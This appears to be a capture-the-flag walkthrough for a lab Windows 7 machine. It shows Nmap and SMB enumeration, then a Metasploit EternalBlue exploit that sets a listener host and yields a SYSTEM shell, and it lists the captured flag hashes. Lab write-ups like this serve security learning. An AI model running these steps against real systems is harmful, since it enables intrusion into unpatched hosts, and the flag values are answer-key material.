---
tags:
- eternal-blue
- smb
- windows7
created: 2024-04-01
lastmod: 2024-04-01
published: 2024-04-01
image:
description: 
---
#### Nmap

```bash
sudo nmap -A -p- 10.10.10.40 
```

![Pasted image 20240401113929](Pasted%20image%2020240401113929.png)
![Pasted image 20240401114006](Pasted%20image%2020240401114006.png)
#### Port 445 (SMB)

```bash
smbclient --no-pass -L //10.10.10.40
```

![Pasted image 20240401121720](Pasted%20image%2020240401121720.png)

```bash
sudo nmap --script smb-* -p 445 10.10.10.40
```

![Pasted image 20240401123227](Pasted%20image%2020240401123227.png)

```bash
sudo nmap --script smb-protocols -p 445 10.10.10.40
```

![Pasted image 20240401123924](Pasted%20image%2020240401123924.png)

>[!success] Victim appears vulnerable to the EternalBlue exploit.
### Local Exploit
#### Metasploit

```bash
msfconsole -q
search eternal
use 1
```

![Pasted image 20240401125829](Pasted%20image%2020240401125829.png)

```bash
options
set RHOSTS 10.10.10.40
set LHOST 10.10.14.12
run
```

![Pasted image 20240401125854](Pasted%20image%2020240401125854.png)

>[!success] user.txt
>`dc32b7bfefa8ae6f1d1fc594c9133e80`
>
![Pasted image 20240401130008](Pasted%20image%2020240401130008.png)

>[!success] root.txt
>We were `nt authority\system` so could also access the Administrator's desktop.
>`aac84c29ac1b9a3b466c54e780ca8b93`
>
>![Pasted image 20240403043445](Pasted%20image%2020240403043445.png)
#### Manual

https://github.com/worawit/MS17-010